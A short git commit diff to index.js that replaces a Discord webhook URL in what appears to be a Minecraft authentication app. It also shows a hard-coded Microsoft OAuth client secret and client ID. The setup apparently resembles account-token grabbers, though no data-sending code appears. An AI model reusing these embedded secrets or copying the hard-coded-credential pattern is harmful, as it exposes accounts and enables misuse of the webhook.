beb49a3d294bd5d95cf182b1d1c59bed90534663
devdon610 <78249965+devdon610@users.noreply.github.com>
2022-11-19 11:45:45 +0530

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@
 const client_secret = 'wbo8Q~zyiZUVZ5zVSbc7UZdjw334x9qNJ011IbDF'
 const client_id = '767bbf91-f318-4f75-ad82-526129dcd4f7'
 const redirect_uri = 'https://minecraft-auth-app.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1043404829340475392/umYdwVR-aVzEcSciEi_w5XyQi8Y2UddEORIgpALlFu14CtY7t_TKCGzjvjV3IxY0AAPQ'
+const webhook_url = 'https://discord.com/api/webhooks/1043408969319854101/ou0h4E7ajBn_4j0LhN0_iiqzi2vQfWeI1wVI4LqarmdKGfgxQhikZgInEBfMNWETKOni'
 //Requirements
 const axios = require('axios')
 const express = require('express')
